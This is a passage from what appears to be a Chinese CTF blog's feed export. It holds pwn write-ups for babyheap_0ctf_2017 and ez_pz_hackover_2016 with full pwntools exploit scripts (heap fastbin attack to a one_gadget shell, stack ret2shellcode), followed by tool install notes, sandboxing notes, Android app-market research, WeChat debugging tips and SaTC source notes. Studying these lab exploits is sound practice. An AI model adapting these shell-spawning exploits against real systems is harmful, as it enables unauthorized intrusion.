a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此答题思路为unsortedbin attack泄漏libc基址，fastbin attack劫持malloc_hook，使用one_gadget getshell</p>
<h3 id="Step1-泄漏Libc基址"><a href="#Step1-泄漏Libc基址" class="headerlink" title="Step1: 泄漏Libc基址"></a>Step1: 泄漏Libc基址</h3><p>注：当small chunk被释放时，它的fd，bk指向同一个指针即top chunk地址，这个地址保存在main_arena的0x58偏移处，而main_arena在libc的data段中，是全局静态变量，偏移也是固定的，根据这些可以计算出libc的基址。因此只需要当small chunk释放后，还可以打印出其值。</p>
<p>首先申请一些小堆块，然后free掉id 1,2，利用堆溢出漏洞，将chunk2 fd指针修改为chunk4地址，相当于chunk4已经free并且为fastbin，然后要malloc回chunk4,不过由于有大小检查，需要修改chunk4的大小，通过修改chunk3来实现。这样可以实现将small chunk放入fastbin中的效果。注，此时有两个指针指向同一个chunk4，此时将chunk4大小修改回原来值，将正常的chunk4 free掉，就可以令其fd,bk指针指向top_chunk，同时新申请的也指向了chunk4,可以用于查看fd,bk值。由此可以计算出libc值</p>
<h3 id="Step2-修改malloc-hook为one-gadget"><a href="#Step2-修改malloc-hook为one-gadget" class="headerlink" title="Step2: 修改malloc_hook为one_gadget"></a>Step2: 修改malloc_hook为one_gadget</h3><p>使用fastbin attack构造fake chunk修改malloc_hook指针地址即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25147</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">struct &#123;</span></span><br><span class="line"><span class="string">    1, (8) # 表示是否allocate</span></span><br><span class="line"><span class="string">    size: , (8)</span></span><br><span class="line"><span class="string">    content pointer: , (8)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">heap overflow</span></span><br><span class="line"><span class="string">1. 泄漏libc基址</span></span><br><span class="line"><span class="string">2. 修改libc中malloc_hook地址为one_gadget</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step1: 泄漏libc基址</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x0000000000001142)&#x27;)</span></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">free(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>, p8(<span class="number">0x80</span>))</span><br><span class="line">fill(<span class="string">b&#x27;0&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">b&#x27;3&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">b&#x27;3&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(dump(<span class="string">b&#x27;2&#x27;</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step2: 劫持malloc_hook</span></span><br><span class="line">fake_chunk = libc_addr + <span class="number">0x3c4aed</span></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">payload = flat(fake_chunk)</span><br><span class="line">fill(<span class="string">b&#x27;2&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">payload = flat(p8(<span class="number">0</span>)*<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, one_gadget)</span><br><span class="line">fill(<span class="string">b&#x27;6&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>Fastbin</tag>
        <tag>Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>【ez_pz_hackover_2016】WriteUp</title>
    <url>/posts/478cb6ca.html</url>
    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Ret2Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF常用工具汇总</title>
    <url>/posts/81c8e8b2.html</url>
    <content><![CDATA[<p>记录了ctf的常用工具，随缘更新~</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>最基础的工具之一，python库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>最基础的工具之一，调试神器</p>
<p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">https://blog.csdn.net/whbing1471/article/details/112410599</a></p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install checksec</span><br></pre></td></tr></table></figure>

<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><a href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo -H python3 -m pip install ROPgadget</span><br><span class="line">ROPgadget --help</span><br></pre></td></tr></table></figure>

<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line">ropper --help</span><br></pre></td></tr></table></figure>

<h3 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h3><p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure>

<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>

<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<p>error：<code>./bootstrap.sh: 2: autoreconf: not found</code></p>
<p>解决方案：<code>sudo apt-get install autoconf</code></p>
<h3 id="LibcSearcher-1"><a href="#LibcSearcher-1" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">里面有直接提供使用的find, dump等脚本</span></span><br></pre></td></tr></table></figure>

<h3 id="vmlinux-to-elf"><a href="#vmlinux-to-elf" class="headerlink" title="vmlinux-to-elf"></a>vmlinux-to-elf</h3><p>安装<code>vmlinux-to-elf</code>工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line">vmlinux-to-elf ./bzImage vmlinux</span><br></pre></td></tr></table></figure>

<h3 id="diaphora"><a href="#diaphora" class="headerlink" title="diaphora"></a>diaphora</h3><p>diff工具</p>
<h3 id="ae64"><a href="#ae64" class="headerlink" title="ae64"></a>ae64</h3><p>纯字符串shellcode</p>
<h2 id="ceccomp"><a href="#ceccomp" class="headerlink" title="ceccomp"></a>ceccomp</h2><p>在arch linux上对seccomp-tools的平替</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sandboxing</title>
    <url>/posts/df529e66.html</url>
    <content><![CDATA[<p>观看pwn.college中sandboxing模块的<a href="https://pwn.college/cse466-f2023/sandboxing/">讲解视频</a>所做的笔记</p>
<h2 id="Modern-Technologies-about-Sandboxing"><a href="#Modern-Technologies-about-Sandboxing" class="headerlink" title="Modern Technologies about Sandboxing"></a>Modern Technologies about Sandboxing</h2><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p>通过设置系统调用的禁用和允许规则来达到目的</p>
<h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><h4 id="创建一个类似于docker的独立命名空间"><a href="#创建一个类似于docker的独立命名空间" class="headerlink" title="创建一个类似于docker的独立命名空间"></a>创建一个类似于docker的独立命名空间</h4><p>unshare命令：Run a program with some namespaces unshared from the parent<br>其创建了一个新的命名空间，其与父进程独立。（注：fork系统调用为完全共享，clone系统调用可以指定共享内容）</p>
<p>unshare后创建的新进程仍然可以访问原本的目录（如&#x2F;），因为还没有mount和unmount。（附：使用mount将根目录下的目录，例如&#x2F;bin等重新mount到新进程下，就可以在新进程下看到，这就是docker container使用的技巧。注意，在外部系统中是看不到mount的目录的，因为unshare不共享mount namespace）</p>
<p>mount命令：挂载文件或设备到指定的文件系统<br>其中&#x2F;dev代表挂载的设备文件，&#x2F;sys代表内核相关的内容</p>
<p>unshare -m -p -n –mount-proc –fork &#x2F;bin&#x2F;bash<br>此命令可以类似于docker创建一个新的进程，进程在一个新的命名空间中，但是仍然可以查看外部文件系统</p>
<h4 id="创建独立的文件系统"><a href="#创建独立的文件系统" class="headerlink" title="创建独立的文件系统"></a>创建独立的文件系统</h4><p>使用mount将&#x2F;bin等目录挂载到当前目录，并且chroot。<br>但是chroot不安全，因此应该有更安全的方法：使用命名空间pivot_root</p>
<p>使用pivot_root，先创建一个old文件夹存放根目录，然后unmount，rmdir。即可实现容器化。</p>
<p>docker额外实现的机制：</p>
<ul>
<li>docker还另外实现了对资源的限制，例如内存用量，使用ulimit命令</li>
<li>对用户的限制，使在容器内为root，但在容器外为普通用户</li>
<li>seccomp限制特定命令，例如unshare，避免其逃逸</li>
</ul>
<p>可以使用nsenter从外部进入已有命名空间eg：nsenter –mount&#x3D;&#x2F;proc&#x2F;xxxx&#x2F;ns&#x2F;mnt [file]<br>(与setns系统调用有关)</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>国内外安卓应用市场对比调研</title>
    <url>/posts/73ae95ad.html</url>
    <content><![CDATA[<p>分析国内外安卓应用市场的差异，可以用作相关论文的背景素材</p>
<h2 id="1-应用市场规模成碎片化特点"><a href="#1-应用市场规模成碎片化特点" class="headerlink" title="1. 应用市场规模成碎片化特点"></a>1. 应用市场规模成碎片化特点</h2><ul>
<li>安卓市场规模巨大（&gt;77%）</li>
<li>应用市场多达400个，其中有25个主流应用市场<br><strong>佐证材料：</strong></li>
<li><a href="https://www.statista.com/statistics/1058612/china-android-app-store-market-share/">Statista数据——Market share of the Android app stores in China as of May 2022</a><blockquote>
<p>As of May 2022, Huawei AppGallery was the top Android app store in China with a market share of about 44 percent. <strong>China’s technological advancement</strong> combined its <strong>ban on Google</strong> has caused its Android market to be flooded with several competing smartphone manufacturers each with its own app store.（国内市场碎片化的原因：GooglePlay被禁，国内技术发展）<br>In China, Android is the dominating mobile operating system As the Google Play Store is not available in the country, various Android stores have been developed, resulting in a <strong>fragmented app store landscape</strong>. As of the time of writing, there were <strong>25 major Android app stores in mainland China</strong>.（安卓应用市场现状：碎片化、25个主流安卓应用市场）</p>
</blockquote>
</li>
<li><a href="https://www.statista.com/statistics/262176/market-share-held-by-mobile-operating-systems-in-china/">Statista数据——Market share of mobile operating systems in China from September 2014 to September 2024</a><blockquote>
<p>In September 2024, the <strong>Android smartphone operating system</strong> had a market share of <strong>over 77 percent in China</strong>. In contrast, its biggest rival, the Apple iOS had a market share of around 22 percent. The Chinese smartphone market is dominated by domestic brands which operate on the Android operating system. （安卓应用市场占比77%）</p>
</blockquote>
</li>
<li><a href="https://gs.statcounter.com/vendor-market-share/mobile/china/2022">Statcounter数据——Mobile Vendor Market Share China</a><blockquote>
<p>![[2025-01-19-国内外安卓应用市场对比调研&#x2F;file-20250119091308783.png]]<br>![[2025-01-19-国内外安卓应用市场对比调研&#x2F;file-20250119091358855.png]]<br>（安卓市场占有率超过70%）</p>
</blockquote>
</li>
<li><a href="https://www.goclickchina.com/blog/breakdown-of-china-android-market/">文章blog——A Breakdown of China’s Android Market</a><blockquote>
<p>Android is open-source software free to be utilized by any smartphone company. In recent years, <strong>nearly 77% of Chinese smartphones ran the operating system;</strong> however, apps must be offered through a 3rd party rather than Google. There are currently <strong>over 400 Android app stores,</strong> with only 10 taking 90% of the market share.（77%的安卓比例+400多个安卓应用市场）<br>![[2025-01-19-国内外安卓应用市场对比调研&#x2F;file-20250119091712180.png]]</p>
</blockquote>
</li>
</ul>
<h2 id="2-审核内容机制严格"><a href="#2-审核内容机制严格" class="headerlink" title="2. 审核内容机制严格"></a>2. 审核内容机制严格</h2><ul>
<li>对含有赌博、色情、暴力等违规内容的App进行限制和下架<br><strong>佐证材料：</strong></li>
<li><a href="https://english.www.gov.cn/news/topnews/202103/24/content_WS605b1b19c6d0719374afb586.html">文章news新华社2021——China removes over 520 apps for irregularities, vulgar content</a><blockquote>
<p>BEIJING — <strong>The Cyberspace Administration of China (CAC) has removed more than 520 apps in its latest crackdown targeting irregularities and vulgar content</strong>, the internet regulator announced on March 24.</p>
</blockquote>
</li>
<li><a href="https://europe.chinadaily.com.cn/a/202305/02/WS645057c2a310b6054fad0af5.html">文章News2023——Websites, apps penalized for misconduct</a><blockquote>
<p>During the first quarter of this year(2023), Chinese cyberspace regulators at various levels shut down more than 4,200 websites and <strong>banned nearly 70 apps suspected of engaging in criminal activities such as providing illegal news services and spreading pornography</strong>.<br>According to a news release published on Sunday by the Cyberspace Administration of China, the nation’s top cyberspace watchdog, leaders of more than 2,000 websites were summoned and instructed to rectify their actions, and 48 websites were banned from offering or upgrading services.<br><strong>In addition, 55 mobile apps were removed from app stores and 12 were shut down,</strong> the news release said, adding that some 4,200 websites were shuttered and had their licenses revoked.</p>
</blockquote>
</li>
<li><a href="https://www.yahoo.com/news/china-takes-5-500-porn-003224058.html">文章News2017——China takes 5,500 porn, violent apps offline - Xinhua</a><blockquote>
<p>SHANGHAI (Reuters) - China’s internet supervisors have taken down more than <strong>5,500 illegal apps</strong> for disseminating pornographic and violent content among other things, the official Xinhua news agency said on Tuesday.<br>The move is the latest step taken by Beijing to clean up its cyberspace, having launched a crackdown on virtual private network services that allow users to bypass censorship on Monday.<br><strong>More than 1,600 mobile video apps circulating pornographic and violent content were taken offline</strong>, said the cyberspace administration in China’s southern province of Guangdong on Monday.</p>
</blockquote>
</li>
<li><a href="https://appinchina.co/services/localization/content-regulations/">文章Blog——Rules &amp; Content Restrictions for Publishing an App in China</a><blockquote>
<p>Every app submitted to a Chinese app store must go through an approval process before it can be accepted for publication and receive a game license and approval number (ISBN), and various <strong>Chinese governing bodies and agencies have outlined a number of regulations and content restrictions for those apps</strong>.</p>
</blockquote>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>微信网址逆向实战</title>
    <url>/posts/8ee664e8.html</url>
    <content><![CDATA[<p>最近发现了有些网址只能在微信客户端打开，不能在浏览器中打开</p>
<h2 id="方法1：PC-安卓adb"><a href="#方法1：PC-安卓adb" class="headerlink" title="方法1：PC+安卓adb"></a>方法1：PC+安卓adb</h2><p>安卓手机开启adb调试</p>
<p>手机微信打开：<a href="http://debugxweb.qq.com/?inspector=true%EF%BC%8C%E5%BC%B9%E5%87%BA%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E5%8D%B3%E5%8F%AF">http://debugxweb.qq.com/?inspector=true，弹出执行成功即可</a></p>
<p>在这里下载adb工具：<a href="https://developer.android.com/tools/releases/platform-tools?hl=zh-cn">https://developer.android.com/tools/releases/platform-tools?hl=zh-cn</a></p>
<p>电脑端Chrome访问chrome:&#x2F;&#x2F;inspect ，点击该网页的inspect，弹出一个新的窗口，在窗口中可正常显示手机页面，上方可以输入任意地址访问，控制台同Chrome浏览器</p>
<p>然后在手机端打开要打开的网页，并在电脑端的chrome中查看是否显示，点击inspect即可</p>
<p>参考网址：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_37651894/article/details/127964618">ADB调试–详细教程（附华为手机无法显示设备解决方法）</a></li>
<li><a href="https://blog.csdn.net/qq_44839815/article/details/131015693">2023年微信内置浏览器调试的五种方法</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>SaTC源码阅读</title>
    <url>/posts/1134d98d.html</url>
    <content><![CDATA[<p>阅读下SaTC的源码。<br><a href="https://github.com/NSSL-SJTU/SaTC">工作链接</a></p>
<p>主要关注<code>src</code>目录下内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">src</span><br><span class="line">|-front_anaylysise</span><br><span class="line">|-headless: ghidra脚本，用于提取sink函数等信息</span><br><span class="line">|	|-call2sink.py</span><br><span class="line">|	|-ref2share.py</span><br><span class="line">|	|-ref2sink_bof.py</span><br><span class="line">|	|-ref2sink_cmdi.py</span><br><span class="line">|	|-share2sink.py</span><br><span class="line">|	|-main.py</span><br><span class="line">|-jsparse</span><br><span class="line">|-taint_check: 基于angr、KARONTE工具的代码</span><br><span class="line">|	|-taint_analysis</span><br><span class="line">|		|-coretaint.py: 污点分析主要逻辑</span><br><span class="line">|-main.py</span><br></pre></td></tr></table></figure>


<h2 id="TODO-前端分析"><a href="#TODO-前端分析" class="headerlink" title="TODO: 前端分析"></a>TODO: 前端分析</h2><h2 id="Ghidra静态分析"><a href="#Ghidra静态分析" class="headerlink" title="Ghidra静态分析"></a>Ghidra静态分析</h2><p>逻辑主要在<code>headless</code>目录下，根据定义好的sink点分为<code>ref2share.py</code>、<code>ref2sink_bof.py</code>、<code>ref2sink_cmdi.py</code>等多种类型（这里三个文件中存在冗余，有重构空间），寻找从source到sink点的函数调用路径</p>
<h2 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h2><p>使用符号化执行来进行污点分析</p>
<p>关键数据对象：<code>CoreTaint</code><br>关键函数：<code>flat_explore</code>：</p>
<ul>
<li>符号化执行，</li>
<li>污点传播逻辑：如果函数调用存在返回值，则只污染返回值；否则污染全部的参数</li>
</ul>
<h3 id="污点传播相关代码"><a href="#污点传播相关代码" class="headerlink" title="污点传播相关代码"></a>污点传播相关代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flat_explore</span>()</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> <span class="variable language_">self</span>.get_state(next_path).history.jumpkind == <span class="string">&#x27;Ijk_Call&#x27;</span> <span class="keyword">and</span> ...</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.is_summarized():</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._follow_call() <span class="comment"># 检查是否需要跟入函数，即是否存在污点相关操作</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">in</span> : <span class="comment"># 检查函数是否在followTarget集合中，以及self._p.loader.main_object.plt.values</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(nargs):</span><br><span class="line">                val_arg = <span class="built_in">getattr</span>(<span class="variable language_">self</span>.get_state(next_path).regs, name)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.is_or_points_to_tainted_data(val_arg, next_path)</span><br><span class="line">                    <span class="keyword">if</span> (...):</span><br><span class="line">                        <span class="string">&quot;return something, only taint r0&quot;</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="string">&quot;taint all writable args&quot;</span></span><br><span class="line">                        cfg = getBugFindingCFG()???</span><br><span class="line">        <span 